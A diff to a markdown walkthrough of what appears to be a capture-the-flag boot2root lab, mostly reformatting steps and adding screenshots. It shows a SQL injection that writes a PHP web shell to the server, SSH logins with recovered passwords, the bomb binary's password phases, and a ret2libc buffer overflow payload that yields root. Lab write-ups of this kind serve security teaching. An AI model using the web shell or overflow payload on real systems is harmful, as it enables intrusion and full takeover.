@@ -53,6 +53,7 @@ We need to understand what exactly we are going to "hack".
    * During several attemtps of the injection files into different known folders that exist on the site, we were finally able to make a needed injection into the "temaplates_c" folder<br/>
     `SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";`<br/>
     ![db_injection](screens/db_injection.jpg)<br/>
+    
 ### 8. thanks to the tutorial we can now use shell commands of the server from the browser 
    * which gives us the possibility to find credentials to access the server found in password file in LOOKATME folder<br/>
    ![bash_in_browser](screens/bash_trough_browser.jpg)<br/>
@@ -87,8 +88,10 @@ We need to understand what exactly we are going to "hack".
      now we see that the password "Iheartpwnage" looks like case sensetive
    * In fun archive we also saw hint about SHA256, lets encode our password to SHA256    `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
    * and try to ssh on the server with `laurie@192.168.12.128` and password
+   
 ### 10. We are successfully ssh with laurie user
 * we see the README file that gives us a hint how to get password for the ssh access with user "thor"
+![bomb_readme_hint](screens/bomb_readme_hint.jpg)<br/>
 * disasemple bomb file and we see 6 functions
   * **Phase_1** pushes value to the stack 0x80497c0, which is "Public speaking is very easy." Also hint says that password has no spaces and case sensetive, modifing string and getting first part of out password: `Publicspeakingisveryeasy.`
   * **Phase_2** function 'read_six_numbers' and the string '%d %d %d %d %d %d' at the address 0x08049b1b. We assume that first number is 1, the others are multiples by the last number in the sequense so we have to do it 6 times according to the string. 1*1 2*1 2*3 6*4 24*5 120*6 so the next part of our password is: `12624120720`
@@ -99,21 +102,26 @@ We need to understand what exactly we are going to "hack".
 The password in the end: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 ### 11. ssh thor@192.168.12.128 
-    We see the README and turtle files
-    README suggests us to login with user zaz
-    the turtle file is a draw map which is python module
-    it gives us the word SLASH
+* We see the README and turtle files
+* README suggests us to login with user zaz
+* the turtle file is a draw map which is python module, see our programm to draw it out main.py 
+* it gives us the word SLASH<br/>
+![slash](screens/slash.jpg)<br/>
+
 ### 12. ssh zaz@192.168.12.128
-    trying password SLASH, does not work
-    sha256 encryption of SLASH does not work eather
-    md5 does work
+* trying password SLASH, does not work
+* sha256 encryption of SLASH does not work eather
+* md5 does work<br/>
+![md5_pass](screens/md5_pass.jpg)<br/>
+
 ### 13. we find a file exploit_me and it has a root rights
-    If we open exploit_me into gdb we notice that we can use a buffer overflow attack and overwrite the EIP register due to the use of an unprotected strcpy.
-    Playing around with the command line we can make the program crash at 140 bytes.
-    ./exploit_me $(python -c "print('A' * 140)")
+* If we open exploit_me into gdb we notice that we can use a buffer overflow attack and overwrite the EIP register due to the use of an unprotected strcpy.
+* Playing around with the command line we can make the program crash at 140 bytes.<br/>
+`./exploit_me $(python -c "print('A' * 140)")`
+
 ### 14. we need to exploit
-$ ./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
-id
-uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz) 
-    gives us root permissions using a well know security risk on strcpy which provides us with the possiblity to user ret2libc atack, very well known attack
+* `./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")`<br/>
+   `id`<br/>
+   uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)<br/>
+   gives us root permissions using a well know security risk on strcpy which provides us with the possiblity to user ret2libc atack, very well known attack
     
